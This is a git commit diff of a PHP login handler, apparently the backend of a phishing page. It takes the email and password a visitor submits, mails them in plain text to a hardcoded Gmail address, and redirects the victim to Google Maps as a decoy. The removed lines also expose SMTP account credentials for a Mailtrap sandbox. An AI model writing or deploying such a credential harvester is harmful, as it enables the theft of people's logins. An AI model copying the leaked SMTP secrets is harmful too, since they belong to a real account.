970824c16f624d847ca33db43bb8fe5d9ae1ff6c
laboratorioganso@gmail.com <seu.email@example.com>
2024-07-16 16:38:26 -0300

    Initial commit

--- process_login.php
+++ process_login.php
@@ -1,39 +1,21 @@
 <?php
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
-
-require 'vendor/autoload.php';
-
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $email = $_POST['email'];
     $password = $_POST['password'];
-    $to = 'laboratorioganso@gmail.com'; // Seu endereço de e-mail
+
+    // Configurações do Mailtrap
+    $to = 'laboratorioganso@gmail.com';
     $subject = 'Novo Login';
     $message = 'E-mail: ' . $email . "\r\n" . 'Senha: ' . $password;
     $headers = 'From: no-reply@example.com' . "\r\n" . 'Reply-To: no-reply@example.com';
 
-    $mail = new PHPMailer(true);
-    try {
-        $mail->isSMTP();
-        $mail->Host = 'sandbox.smtp.mailtrap.io';
-        $mail->SMTPAuth = true;
-        $mail->Username = '9a85fb5eab83ca';
-        $mail->Password = '8658069f8a2ec5';
-        $mail->SMTPSecure = 'tls';
-        $mail->Port = 2525;
-
-        $mail->setFrom('no-reply@example.com', 'Mailer');
-        $mail->addAddress($to);
-
-        $mail->isHTML(false);
-        $mail->Subject = $subject;
-        $mail->Body = $message;
-
-        $mail->send();
+    // Envia o e-mail
+    if (mail($to, $subject, $message, $headers)) {
+        // Redireciona para o Google Maps
         header("Location: https://maps.google.com");
         exit();
-    } catch (Exception $e) {
-        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+    } else {
+        echo "Erro ao enviar o e-mail.";
     }
 }
 ?>
